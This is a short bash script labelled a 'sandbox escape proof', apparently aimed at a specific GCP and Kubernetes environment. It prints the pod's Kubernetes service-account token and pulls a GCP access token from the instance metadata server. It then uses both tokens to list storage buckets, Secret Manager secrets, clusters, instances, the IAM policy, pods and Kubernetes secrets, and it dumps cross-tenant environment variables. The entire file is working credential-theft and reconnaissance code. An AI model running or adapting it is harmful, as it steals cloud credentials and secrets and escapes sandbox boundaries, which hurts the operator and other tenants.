#!/bin/bash
# Sandbox escape proof - fetches GCP token and tests access to external resources
echo "=== identity ==="; id; hostname; date -u
echo "=== kubernetes SA token ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo
echo "=== kubernetes namespace ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo
MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
echo "=== GCP: fetching access_token ==="
TOKENJSON=$(curl -sf -m 8 -H "$MH" "$MD/instance/service-accounts/default/token")
TOKEN=$(echo "$TOKENJSON" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
echo "token_json_len: ${#TOKENJSON}"
echo "token_prefix: ${TOKEN:0:30}..."
echo "email: $(curl -sf -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")"
echo "scopes: $(curl -sf -m 5 -H "$MH" "$MD/instance/service-accounts/default/scopes")"
echo "project: $(curl -sf -m 5 -H "$MH" "$MD/project/project-id")"
echo "zone: $(curl -sf -m 5 -H "$MH" "$MD/instance/zone")"
if [ -n "$TOKEN" ]; then
echo "=== ESCAPE 1: GCS Buckets ==="
curl -sf -m 8 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=yextenv-sbx&maxResults=5" | head -c 2000
echo
echo "=== ESCAPE 2: Secret Manager ==="
curl -sf -m 8 -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/yextenv-sbx/secrets?pageSize=5" | head -c 2000
echo
echo "=== ESCAPE 3: GKE Clusters ==="
curl -sf -m 8 -H "Authorization: Bearer $TOKEN" "https://container.googleapis.com/v1/projects/yextenv-sbx/locations/-/clusters" | head -c 2000
echo
echo "=== ESCAPE 4: Compute ==="
curl -sf -m 8 -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/yextenv-sbx/zones/us-east4-a/instances?maxResults=3" | head -c 2000
echo
echo "=== ESCAPE 5: IAM Policy ==="
curl -sf -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/yextenv-sbx:getIamPolicy" -d '{}' | head -c 2000
echo
else
echo "SKIP: no GCP token available"
fi
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
echo "=== ESCAPE 6: K8s SelfSubjectAccessReview ==="
curl -sf -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"live-preview-sbx","verb":"list","resource":"secrets"}}}' 
echo
echo "=== ESCAPE 7: K8s namespaces ==="
curl -sf -m 8 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces" | head -c 2000
echo
echo "=== ESCAPE 8: K8s pods ==="
curl -sf -m 8 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/live-preview-sbx/pods?limit=5" | head -c 2000
echo
echo "=== ESCAPE 9: K8s secrets ==="
curl -sf -m 8 --cacert $CA -H "Authorization: Bearer $K8S" "https://kubernetes.default.svc/api/v1/namespaces/live-preview-sbx/secrets?limit=3" | head -c 2000
echo
echo "=== CROSS-TENANT: peer pods ==="
env | grep LIVE_PREVIEW_ | grep SERVICE_HOST | sort
echo "=== YEXT env ==="
env | grep -E '^YEXT_'
echo "=== DONE ==="
